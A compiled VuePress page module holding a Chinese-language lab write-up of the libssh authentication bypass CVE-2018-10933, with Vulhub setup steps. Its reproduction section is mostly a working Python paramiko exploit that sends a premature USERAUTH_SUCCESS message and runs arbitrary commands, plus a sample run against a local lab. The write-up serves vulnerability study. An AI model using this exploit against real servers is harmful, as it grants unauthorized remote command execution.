import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as c,c as i,a as n,b as s,d as t,e}from"./app-58e4a7d6.js";const l={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,[s("libssh是一个提供ssh相关接口的开源库，包含服务端、客户端等。其服务端代码中存在一处逻辑错误，攻击者可以在认证成功前发送"),n("code",null,"MSG_USERAUTH_SUCCESS"),s("消息，绕过认证过程，未授权访问目标SSH服务器。")],-1),d=n("p",null,"参考资料：",-1),k={href:"https://www.libssh.org/security/advisories/CVE-2018-10933.txt",target:"_blank",rel:"noopener noreferrer"},v={href:"https://www.seebug.org/vuldb/ssvid-97614",target:"_blank",rel:"noopener noreferrer"},m=e(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动存在漏洞的环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，我们可以连接<code>your-ip:2222</code>端口（账号密码：<code>myuser:mypassword</code>），这是一个合法的ssh流程：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 myuser@127.0.0.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202262022920.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,7),b={href:"https://www.seebug.org/vuldb/ssvid-97614",target:"_blank",rel:"noopener noreferrer"},g=e(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> paramiko
<span class="token keyword">import</span> socket
<span class="token keyword">import</span> logging

logging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>stream<span class="token operator">=</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span> level<span class="token operator">=</span>logging<span class="token punctuation">.</span>DEBUG<span class="token punctuation">)</span>
bufsize <span class="token operator">=</span> <span class="token number">2048</span>


<span class="token keyword">def</span> <span class="token function">execute</span><span class="token punctuation">(</span>hostname<span class="token punctuation">,</span> port<span class="token punctuation">,</span> command<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>hostname<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        message <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>message<span class="token punctuation">.</span>Message<span class="token punctuation">(</span><span class="token punctuation">)</span>
        transport <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>Transport<span class="token punctuation">(</span>sock<span class="token punctuation">)</span>
        transport<span class="token punctuation">.</span>start_client<span class="token punctuation">(</span><span class="token punctuation">)</span>

        message<span class="token punctuation">.</span>add_byte<span class="token punctuation">(</span>paramiko<span class="token punctuation">.</span>common<span class="token punctuation">.</span>cMSG_USERAUTH_SUCCESS<span class="token punctuation">)</span>
        transport<span class="token punctuation">.</span>_send_message<span class="token punctuation">(</span>message<span class="token punctuation">)</span>

        client <span class="token operator">=</span> transport<span class="token punctuation">.</span>open_session<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>
        client<span class="token punctuation">.</span>exec_command<span class="token punctuation">(</span>command<span class="token punctuation">)</span>

        <span class="token comment"># stdin = client.makefile(&quot;wb&quot;, bufsize)</span>
        stdout <span class="token operator">=</span> client<span class="token punctuation">.</span>makefile<span class="token punctuation">(</span><span class="token string">&quot;rb&quot;</span><span class="token punctuation">,</span> bufsize<span class="token punctuation">)</span>
        stderr <span class="token operator">=</span> client<span class="token punctuation">.</span>makefile_stderr<span class="token punctuation">(</span><span class="token string">&quot;rb&quot;</span><span class="token punctuation">,</span> bufsize<span class="token punctuation">)</span>

        output <span class="token operator">=</span> stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
        error <span class="token operator">=</span> stderr<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

        stdout<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        stderr<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

        <span class="token keyword">return</span> <span class="token punctuation">(</span>output<span class="token operator">+</span>error<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> paramiko<span class="token punctuation">.</span>SSHException <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        logging<span class="token punctuation">.</span>exception<span class="token punctuation">(</span>e<span class="token punctuation">)</span>
        logging<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token string">&quot;TCPForwarding disabled on remote server can&#39;t connect. Not Vulnerable&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">:</span>
        logging<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token string">&quot;Unable to connect.&quot;</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> <span class="token boolean">None</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>execute<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>python CVE<span class="token operator">-</span><span class="token number">2018</span><span class="token operator">-</span><span class="token number">10933</span><span class="token punctuation">.</span>py <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token number">2222</span> <span class="token string">&quot;ps aux&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202262032774.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,3);function _(h,y){const a=o("ExternalLinkIcon");return c(),i("div",null,[u,r,d,n("ul",null,[n("li",null,[n("a",k,[s("https://www.libssh.org/security/advisories/CVE-2018-10933.txt"),t(a)])]),n("li",null,[n("a",v,[s("https://www.seebug.org/vuldb/ssvid-97614"),t(a)])])]),m,n("p",null,[s("参考 "),n("a",b,[s("https://www.seebug.org/vuldb/ssvid-97614"),t(a)]),s(" 中给出的POC，我们编写一个简单的漏洞复现脚本：")]),g])}const x=p(l,[["render",_],["__file","Libssh 服务端权限认证绕过漏洞 CVE-2018-10933.html.vue"]]);export{x as default};
